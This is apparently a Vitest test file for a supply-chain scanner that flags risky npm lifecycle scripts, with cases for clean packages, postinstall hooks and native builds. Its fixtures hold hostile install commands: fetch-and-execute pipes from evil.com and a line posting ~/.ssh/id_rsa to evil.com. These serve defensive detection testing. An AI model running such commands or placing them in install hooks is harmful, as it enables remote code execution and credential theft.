import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { SupplyChainPolicySchema } from '@secureship/contracts';
import { detectInstallScripts } from '../../src/supply-chain/detectors/install-script.detector.js';
import type { DetectorContext } from '../../src/supply-chain/internal/types.js';

describe('InstallScriptDetector (SC-INSTALL-*)', () => {
  const defaultPolicy = SupplyChainPolicySchema.parse({});
  const ctx: DetectorContext = {
    packageName: 'test-package',
    version: '1.0.0',
    ecosystem: 'npm',
    packageDir: os.tmpdir(),
    now: () => new Date('2026-10-21T00:00:00Z'),
  };

  it('reports zero hits for clean package with safe scripts', () => {
    const pkgJson = {
      name: 'test-package',
      version: '1.0.0',
      scripts: {
        test: 'vitest run',
        build: 'tsc -p tsconfig.json',
        lint: 'eslint .',
      },
    };

    const hits = detectInstallScripts(pkgJson, os.tmpdir(), defaultPolicy, ctx);
    expect(hits).toHaveLength(0);
  });

  it('allows default standard "node-gyp rebuild" install script', () => {
    const pkgJson = {
      name: 'test-package',
      version: '1.0.0',
      scripts: {
        install: 'node-gyp rebuild',
      },
    };

    const hits = detectInstallScripts(pkgJson, os.tmpdir(), defaultPolicy, ctx);
    expect(hits).toHaveLength(0);
  });

  it('detects standard postinstall hook (SC-INSTALL-001)', () => {
    const pkgJson = {
      name: 'test-package',
      version: '1.0.0',
      scripts: {
        postinstall: 'node scripts/download-assets.js',
      },
    };

    const hits = detectInstallScripts(pkgJson, os.tmpdir(), defaultPolicy, ctx);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.ruleId).toBe('SC-INSTALL-001');
    expect(hits[0]!.severity).toBe('MEDIUM');
    expect(hits[0]!.blocking).toBe(false);
    expect(hits[0]!.capabilities?.hasInstallScript).toBe(true);
  });

  it('detects dangerous remote fetch-and-execute in install script (SC-INSTALL-003)', () => {
    const dangerousCommands = [
      'curl -s http://evil.com/setup.sh | bash',
      'wget -q http://evil.com/bin | sh',
      'invoke-webrequest http://evil.com/payload.ps1 | iex',
      'bash -c "$(curl -fsSL https://evil.com/run)"',
    ];

    for (const cmd of dangerousCommands) {
      const pkgJson = {
        name: 'test-package',
        version: '1.0.0',
        scripts: {
          preinstall: cmd,
        },
      };

      const hits = detectInstallScripts(pkgJson, os.tmpdir(), defaultPolicy, ctx);
      expect(hits).toHaveLength(1);
      expect(hits[0]!.ruleId).toBe('SC-INSTALL-003');
      expect(hits[0]!.severity).toBe('CRITICAL');
      expect(hits[0]!.blocking).toBe(true);
      expect(hits[0]!.capabilities?.hasShell).toBe(true);
    }
  });

  it('detects dangerous base64 decode and credential exfiltration patterns (SC-INSTALL-003)', () => {
    const pkgJson = {
      name: 'test-package',
      version: '1.0.0',
      scripts: {
        install: 'cat ~/.ssh/id_rsa | curl -X POST -d @- http://evil.com/leak',
      },
    };

    const hits = detectInstallScripts(pkgJson, os.tmpdir(), defaultPolicy, ctx);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.ruleId).toBe('SC-INSTALL-003');
    expect(hits[0]!.severity).toBe('CRITICAL');
  });

  it('detects base64 decode pattern in install hook (SC-INSTALL-003)', () => {
    const pkgJson = {
      name: 'test-package',
      version: '1.0.0',
      scripts: {
        postinstall: 'echo "aGVsbG8=" | base64 -d | sh',
      },
    };

    const hits = detectInstallScripts(pkgJson, os.tmpdir(), defaultPolicy, ctx);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.ruleId).toBe('SC-INSTALL-003');
  });

  it('computes snippet hash for lifecycle script to support policy allowlisting', () => {
    const script = 'node setup.js';
    const pkgJson = {
      name: 'my-audited-package',
      version: '1.0.0',
      scripts: {
        install: script,
      },
    };

    const auditedCtx: DetectorContext = {
      ...ctx,
      packageName: 'my-audited-package',
    };

    const hits = detectInstallScripts(pkgJson, os.tmpdir(), defaultPolicy, auditedCtx);
    expect(hits).toHaveLength(1);
    expect(hits[0]!.evidence[0]!.snippetSha256).toMatch(/^[a-f0-9]{64}$/);
    expect(hits[0]!.evidence[0]!.redactedSnippet).toBe('"install": "node setup.js"');
  });

  it('detects implicit native build binding.gyp without install script (SC-INSTALL-002)', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-test-gyp-'));
    try {
      fs.writeFileSync(path.join(tempDir, 'binding.gyp'), '{ "targets": [] }', 'utf-8');

      const pkgJson = {
        name: 'native-pkg',
        version: '1.0.0',
      };

      const gypCtx: DetectorContext = {
        ...ctx,
        packageName: 'native-pkg',
        packageDir: tempDir,
      };

      const hits = detectInstallScripts(pkgJson, tempDir, defaultPolicy, gypCtx);
      expect(hits).toHaveLength(1);
      expect(hits[0]!.ruleId).toBe('SC-INSTALL-002');
      expect(hits[0]!.severity).toBe('MEDIUM');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });
});
